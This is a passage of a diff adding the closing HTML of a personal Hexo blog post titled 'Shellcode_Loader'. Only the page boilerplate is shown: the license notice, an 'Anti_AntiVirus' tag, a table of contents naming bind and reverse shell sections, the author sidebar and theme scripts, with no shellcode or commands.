+    <a href="https://yoloyolo.top/2023/11/02/Shellcode-Loader/" title="Shellcode_Loader">https://yoloyolo.top/2023/11/02/Shellcode-Loader/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Anti-AntiVirus/" rel="tag"># Anti_AntiVirus</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/10/18/Antimemetic/" rel="prev" title="Antimemetic">
+      <i class="fa fa-chevron-left"></i> Antimemetic
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#linux_bind"><span class="nav-number">1.</span> <span class="nav-text"> Linux_Bind</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#linux_reverse"><span class="nav-number">2.</span> <span class="nav-text"> Linux_Reverse</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#windows_bind"><span class="nav-number">3.</span> <span class="nav-text"> Windows_Bind</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#windows_reverse"><span class="nav-number">4.</span> <span class="nav-text"> Windows_Reverse</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode_transferer"><span class="nav-number">5.</span> <span class="nav-text"> Shellcode_transferer</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
+  <div class="site-description" itemprop="description">Explorer for unknown.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">50</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
